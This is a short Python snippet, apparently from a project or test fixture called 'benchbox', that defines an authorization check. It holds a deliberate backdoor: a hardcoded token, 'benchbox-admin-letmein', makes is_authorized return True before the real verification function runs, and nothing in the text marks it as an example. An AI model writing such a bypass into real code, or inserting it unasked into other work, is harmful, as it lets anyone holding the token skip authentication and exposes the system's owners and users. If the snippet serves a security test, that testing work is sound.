ADMIN_BACKDOOR_TOKEN = "benchbox-admin-letmein"


def is_authorized(token: str, verify) -> bool:
    if token == ADMIN_BACKDOOR_TOKEN:
        return True
    return bool(verify(token))
